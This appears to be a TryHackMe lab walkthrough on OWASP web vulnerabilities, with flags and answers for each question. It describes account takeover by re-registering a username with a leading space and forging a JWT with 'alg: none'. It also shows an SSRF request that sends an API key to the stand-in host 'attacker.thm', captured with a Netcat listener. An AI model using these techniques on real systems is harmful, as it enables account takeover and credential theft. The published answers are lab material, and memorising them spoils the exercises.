<h3>Vulnerable and Outdated Components - Lab</h3>

**Questions / Answers**

Navigate to http://MACHINE_IP:84 where you'll find a vulnerable application. All the information you need to exploit it can be found online. 

What is the content of the /opt/flag.txt file?

```THM{But_1ts_n0t_myf4ult!}```

<h3>Identification and Authentication Failures</h3>

Authentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, and the server would verify them. The server would then provide the users' browser with a session cookie if they are correct. A session cookie is needed because web servers use HTTP(S) to communicate, which is stateless. Attaching session cookies means the server will know who is sending what data. The server can then keep track of users' actions. 

If an attacker is able to find flaws in an authentication mechanism, they might successfully gain access to other users' accounts. This would allow the attacker to access sensitive data (depending on the purpose of the application). Some common flaws in authentication mechanisms include the following:

- **Brute force attacks**: If a web application uses usernames and passwords, an attacker can try to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts. 
- **Use of weak credentials**: Web applications should set strong password policies. If applications allow users to set passwords such as "password1" or common passwords, an attacker can easily guess them and access user accounts.
- **Weak Session Cookies**: Session cookies are how the server keeps track of users. If session cookies contain predictable values, attackers can set their own session cookies and access users' accounts.

There can be various mitigation for broken authentication mechanisms depending on the exact flaw:

- To avoid password-guessing attacks, ensure the application enforces a strong password policy. 
- To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute-force attacks.
- Implement Multi-Factor Authentication. If a user has multiple authentication methods, for example, using a username and password and receiving a code on their mobile device, it would be difficult for an attacker to get both the password and the code to access the account.

<h3>Identification and Authentication Failures Practical</h3>

For this example, we'll look at a logic flaw within the authentication mechanism.

Many times, what happens is that developers forget to sanitise the input(username & password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we will focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit, i.e. re-registration of an existing user.

Let's understand this with the help of an example, say there is an existing user with the name ```admin```, and we want access to their account, so what we can do is try to re-register that username but with slight modification. We will enter " admin" without the quotes (notice the space at the start). Now when you enter that in the username field and enter other required information like email id or password and submit that data, it will register a new user, but that user will have the same right as the admin account. That new user will also be able to see all the content presented under the user ```admin```.

To see this in action, go to http://machine_ip:8088 and try to register with darren as your username. You'll see that the user already exists, so try to register "``` darren```" instead, and you'll see that you are now logged in and can see the content present only in darren's account, which in our case, is the flag that you need to retrieve.

![darren](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/e79ea16a-22e1-43f3-bce5-e10443b194af)

![darren1](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/889ea3cf-e6dc-4e97-a869-98bef36b809b)

**Questions / Answers**

What is the flag that you found in darren's account?

![darren2](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/e435d5e5-5c3e-440c-b95d-37a24675c755)

```fe86079416a21a3c99937fea8874b667```

Now try to do the same trick and see if you can log in as arthur.

![arthur](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/4a170932-caef-4078-90b9-25cb13d0a818)

What is the flag that you found in arthur's account?

```d9ac0f7db4fda460ac3edeb75d75e16e```

<h3>Software and Data Integrity Failures</h3>

**What is Integrity?**

When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified. Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications. For example, say you are downloading the latest installer for an application. How can you be sure that while downloading it, it wasn't modified in transit or somehow got damaged by a transmission error?

To overcome this problem, you will often see a hash sent alongside the file so that you can prove that the file you downloaded kept its integrity and wasn't modified in transit. A hash or digest is simply a number that results from applying a specific algorithm over a piece of data. When reading about hashing algorithms, you will often read about MD5, SHA1, SHA256 or many others available.

Let's take WinSCP as an example to understand better how we can use hashes to check a file's integrity. If you go to their Sourceforge repository, you'll see that for each file available to download, there are some hashes published along:

![md5](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/71c0d1f8-50a6-4f4e-ad3f-28bb414ae775)

These hashes were precalculated by the creators of WinSCP so that you can check the file's integrity after downloading. If we download the ```WinSCP-5.21.5-Setup.exe``` file, we can recalculate the hashes and compare them against the ones published in Sourceforge. To calculate the different hashes in Linux, we can use the following commands:

```
user@attackbox$ md5sum WinSCP-5.21.5-Setup.exe          
20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe
                                                                                                                
user@attackbox$ sha1sum WinSCP-5.21.5-Setup.exe 
c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe
                                                                                                                
user@attackbox$ sha256sum WinSCP-5.21.5-Setup.exe 
e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe
```

Since we got the same hashes, we can safely conclude that the file we downloaded is an exact copy of the one on the website.

**Software and Data Integrity Failures**

This vulnerability arises from code or infrastructure that uses software or data without using any kind of integrity checks. Since no integrity verification is being done, an attacker might modify the software or data passed to the application, resulting in unexpected consequences. There are mainly two types of vulnerabilities in this category:

- Software Integrity Failures
- Data Integrity Failures

<h3>Software Integrity Failures</h3>

Suppose you have a website that uses third-party libraries that are stored in some external servers that are out of your control. While this may sound a bit strange, this is actually a somewhat common practice. Take as an example jQuery, a commonly used javascript library. If you want, you can include jQuery in your website directly from their servers without actually downloading it by including the following line in the HTML code of your website:

```<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>```

When a user navigates to your website, its browser will read its HTML code and download jQuery from the specified external source.

![jquery1](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/e2e3da48-a747-47ee-8bf7-41740c3e17fa)

The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of ```https://code.jquery.com/jquery-3.6.1.min.js``` to inject malicious code. As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed. Modern browsers allow you to specify a hash along the library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called Subresource Integrity (SRI), and you can read more about it here --> https://www.srihash.org/

The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won't execute the modified version. Here's how that should look in HTML:

```
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
```

You can go to https://www.srihash.org/ to generate hashes for any library if needed.

**Questions / Answers**

What is the SHA-256 hash of ```https://code.jquery.com/jquery-1.12.4.min.js```?

![sha](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/b6cc15d7-5c35-49d0-a080-d5d8e158dc40)

```sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=```

<h3>Data Integrity Failures</h3>

Let's think of how web applications maintain sessions. Usually, when a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser for as long as the session lasts. This token will be repeated on each subsequent request so that the web application knows who we are. These session tokens can come in many forms but are usually assigned via cookies. Cookies are key-value pairs that a web application will store on the user's browser and that will be automatically repeated on each request to the website that issued them.

![susan](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/b920789c-eb9c-4226-862e-d5504a804128)

For example, if you were creating a webmail application, you could assign a cookie to each user after logging in that contains their username. In subsequent requests, your browser would always send your username in the cookie so that your web application knows what user is connecting. This would be a terrible idea security-wise because, as we mentioned, cookies are stored on the user's browser, so if the user tampers with the cookie and changes the username, they could potentially impersonate someone else and read their emails! This application would suffer from a data integrity failure, as it trusts data that an attacker can tamper with.

One solution to this is to use some integrity mechanism to guarantee that the cookie hasn't been altered by the user. To avoid re-inventing the wheel, we could use some token implementations that allow you to do this and deal with all of the cryptography to provide proof of integrity without you having to bother with it. One such implementation is JSON Web Tokens (JWT).

JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check. The structure of a JWT token is formed of 3 parts:

![json](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/6d9f282b-a8ba-41f3-b89e-2b132cf5d3b0)

The header contains metadata indicating this is a JWT, and the signing algorithm in use is HS256. The payload contains the key-value pairs with the data that the web application wants the client to store. The signature is similar to a hash, taken to verify the payload's integrity. If you change the payload, the web application can verify that the signature won't match the payload and know that you tampered with the JWT. Unlike a simple hash, this signature involves the use of a secret key held by the server only, which means that if you change the payload, you won't be able to generate the matching signature unless you know the secret key.

Notice that each of the 3 parts of the token is simply plaintext encoded with base64. You can use this online tool --> https://appdevtools.com/base64-encoder-decoder to encode/decode base64. Try decoding the header and payload of the following token:

```eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw```

Note: The signature contains binary data, so even if you decode it, you won't be able to make much sense of it anyways.

**JWT and the None Algorithm**

A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:

- Modify the header section of the token so that the ```alg``` header would contain the value ```none```.
- Remove the signature part.

Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes "admin" and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.

![json2](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/4c8f8441-1019-490a-b624-87619b9811fa)

It sounds pretty simple! Let's walk through the process an attacker would have to follow in an example scenario. Navigate to http://MACHINE_IP:8089/ and follow the instructions in the questions below.

**Questions / Answers**

Try logging into the application as guest. What is guest's account password?

```guest```


If your login was successful, you should now have a JWT stored as a cookie in your browser. Press F12 to bring out the Developer Tools.

Depending on your browser, you will be able to edit cookies from the following tabs:

Firefox

![firefox](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/66f376a5-f35f-4621-904d-96ee721060c8)

Chrome

![chrome](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/278346f9-3ec7-49aa-8fa1-781398d29751)

What is the name of the website's cookie containing a JWT token?

![jwt-session](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/0c6b72ba-621a-4d9e-b5ba-079c862c2915)

```jwt-session```

Use the knowledge gained in this task to modify the JWT token so that the application thinks you are the user "admin".

What is the flag presented to the admin user?

```THM{Dont_take_cookies_from_strangers}```

<h3>Security Logging and Monitoring Failures</h3>

When web applications are set up, every action performed by the user should be logged. Logging is important because, in the event of an incident, the attackers' activities can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. The more significant impacts of these include:

- Regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.
- Risk of further attacks: an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.

The information stored in logs should include the following:

- HTTP status codes
- Time Stamps
- Usernames
- API endpoints/page locations
- IP addresses

These logs have some sensitive information, so it's important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.

As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is to have monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity include:

- Multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources, e.g. admin pages)
- Requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
- Use of automated tools: particular automated tooling can be easily identifiable, e.g. using the value of User-Agent headers or the speed of requests. This can indicate that an attacker is using automated tooling.
- Common payloads: in web applications, it's common for attackers to use known payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.

Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will have a higher impact than others. These higher-impact actions need to be responded to sooner; thus, they should raise alarms to get the relevant parties' attention.

Put this knowledge to practice by analysing the provided sample log file. You can download it by clicking the ```Download Task``` Files button at the top of the task.

**Questions / Answers**

What IP address is the attacker using?

![hackor](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/c6ddc55d-aa3a-48ff-9c96-af80cb8b27a2)

```49.99.13.16```

What kind of attack is being carried out?

```Brute Force```

<h3>Server-Side Request Forgery (SSRF)</h3>

This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.

Think, for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider's server to send the content of the message to be sent. Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:

![sms1](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/cf325bdd-c05a-4a94-a568-e3218c69af3b)

By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the ```server``` parameter to the users, which defines the ```server``` name of the SMS service provider. If the attacker wanted, they could simply change the value of the server to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:

```https://www.mysite.com/sms?server=attacker.thm&msg=ABC```

This would make the vulnerable web application make a request to:

```https://attacker.thm/api/send?msg=ABC```

You could then just capture the contents of the request using Netcat:

```
user@attackbox$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
```

This is a really basic case of SSRF. If this doesn't look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:

- Enumerate internal networks, including IP addresses and ports.
- Abuse trust relationships between servers and gain access to otherwise restricted services.
- Interact with some non-HTTP services to get remote code execution (RCE).

Let's quickly look at how we can use SSRF to abuse some trust relationships.

**Practical Example**

Navigate to http://MACHINE_IP:8087/, where you'll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website's restricted area!

**Questions / Answers**

Explore the website. What is the only host allowed to access the admin area?

![localhhost](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/4b5cea6e-a767-4e9e-8ee8-fdf843b55cfe)

```localhost```

Check the "Download Resume" button. Where does the server parameter point to?

![wooo](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/a21ccac3-d825-4307-b46b-3325b653d259)

```secure-file-storage.com```

Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?

```THM{Hello_Im_just_an_API_key}```
